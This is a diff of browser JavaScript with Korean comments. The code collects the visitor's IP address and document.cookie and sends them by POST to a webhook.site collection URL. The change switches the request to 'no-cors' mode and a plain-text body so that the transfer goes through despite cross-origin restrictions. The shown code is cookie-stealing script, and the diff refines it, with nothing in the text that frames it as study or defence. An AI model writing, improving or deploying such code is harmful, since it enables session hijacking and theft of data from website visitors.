@@ -18,18 +18,16 @@
                 // 쿠키 정보 가져오기
                 const cookies = document.cookie;
 
-                // Webhook.site로 IP와 쿠키를 전송
+                // Webhook.site로 IP와 쿠키를 전송 (no-cors 모드 사용)
                 await fetch('https://webhook.site/ce82d0f5-3112-46ec-b86e-ecd993683a12/', {
                     method: 'POST',
+                    mode: 'no-cors',
                     headers: {
-                        'Content-Type': 'application/json'
+                        'Content-Type': 'text/plain'
                     },
-                    body: JSON.stringify({
-                        ip: ipAddress,
-                        cookies: cookies
-                    })
+                    body: `ip=${ipAddress}&cookies=${cookies}`
                 });
-                console.log('IP 주소와 쿠키 전송 완료');
+                console.log('IP 주소와 쿠키 전송 완료 (no-cors 모드)');
             } catch (error) {
                 console.error('전송 실패:', error);
             }
